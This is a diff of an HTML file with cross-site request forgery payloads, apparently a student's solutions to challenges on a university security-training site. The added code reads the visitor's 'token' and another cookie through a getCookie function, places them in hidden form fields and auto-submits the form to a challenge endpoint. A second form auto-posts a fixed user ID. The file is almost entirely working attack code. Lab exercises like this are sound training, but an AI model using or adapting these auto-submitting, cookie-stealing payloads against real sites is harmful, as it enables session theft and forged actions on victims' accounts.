@@ -1,21 +1,37 @@
-<iframe name="iframe1">
-    <form id="antmoForm1" name="csrfForm" action="https://snickerboa.it.liu.se/user/csrfchallengetwo/plusplus" method="POST">
-        <input type="hidden" name="userId" value="01bccd80310843d96f854b4a43ab6725a41823bf" />
-        <input type="submit"/>
-    </form>
+<form id="antmoForm3" name="csrfForm" action="https://snickerboa.it.liu.se/challenges/s74a796e84e25b854906d88f622170c1c06817e72b526b3d1e9a6085f429cf52" method="POST">
+    <input id="tokenid" type="hidden" name="csrfToken"/>
+    <input id="msgid" type="hidden" name="myMessage"/>
+    <input type="submit"/>
+</form>
 
-    <script>
-        document.getElementById("antmoForm1").submit();
-    </script>
-</iframe>
-<iframe name="iframe2">
-    <form id="antmoForm2" name="csrfForm" action="https://snickerboa.it.liu.se/user/csrfchallengethree/plusplus" method="POST">
-        <input type="hidden" name="userId" value="01bccd80310843d96f854b4a43ab6725a41823bf" />
-        <input type="hidden" name="csrfToken"/>
-        <input type="submit"/>
-    </form>
-    <iframe name="iframe2"/>
-    <script>
-        document.getElementById("antmoForm2").submit();
-    </script>
-</iframe>
+<script>
+    function getCookie(cname) {
+        var name = cname + "=";
+        var decodedCookie = decodeURIComponent(document.cookie);
+        var ca = decodedCookie.split(';');
+        for(var i = 0; i <ca.length; i++) {
+            var c = ca[i];
+            while (c.charAt(0) == ' ') {
+                c = c.substring(1);
+            }
+            if (c.indexOf(name) == 0) {
+                return c.substring(name.length, c.length);
+            }
+        }
+        return cname + " not found";
+    }
+    document.getElementById("tokenid").value = getCookie("token")
+    document.getElementById("msgid").value = getCookie("securityMisconfigLesson")
+    document.getElementById("antmoForm3").submit();
+</script>
+
+
+<form id="antmoForm1" name="csrfForm" action="https://snickerboa.it.liu.se/user/csrfchallengetwo/plusplus" method="POST">
+    <input type="hidden" name="userId" value="01bccd80310843d96f854b4a43ab6725a41823bf" />
+    <input type="submit"/>
+</form>
+
+<script>
+    document.getElementById("antmoForm1").submit();
+</script>
+
